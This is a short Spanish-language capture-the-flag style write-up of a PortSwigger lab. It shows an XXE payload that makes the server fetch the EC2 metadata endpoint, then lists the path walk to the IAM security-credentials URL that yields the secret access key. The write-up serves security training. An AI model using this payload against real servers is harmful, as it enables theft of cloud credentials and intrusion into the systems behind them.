# XXE to perform SSRF attacks

> This lab has a "Check stock" feature that parses XML input and returns any unexpected values in the response.
>
>  The lab server is running a \(simulated\) EC2 metadata endpoint at the default URL, which is `http://169.254.169.254/`. This endpoint can be used to retrieve data about the instance, some of which might be sensitive.
>
>  To solve the lab, exploit the [XXE](https://portswigger.net/web-security/xxe) vulnerability to perform an [SSRF attack](https://portswigger.net/web-security/ssrf) that obtains the server's IAM secret access key from the EC2 metadata endpoint.

Viendo las paginas de productos ocurre lo mismo que en el laboratorio anterior del envio de documentos.

Para ejecutar el SSRF cambiamos el envio de xml a lo siguiente:

```markup
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE test [ <!ENTITY xxe SYSTEM "http://169.254.169.254/"> ]>
<stockCheck><productId>
&xxe;
</productId><storeId>
&xxe;
</storeId></stockCheck>
```

Con eso obtemenos lo siguiente:

"Invalid product ID: latest "

Esto implica que existe la carpeta latest dentro del objetivo, modificando la request la obtenemos el siguiente directorio:

![](../../../.gitbook/assets/imagen%20%28617%29.png)

Y asi hasta llegar **http://169.254.169.254/latest/meta-data/iam/security-credentials/admin** y obtener la flag.



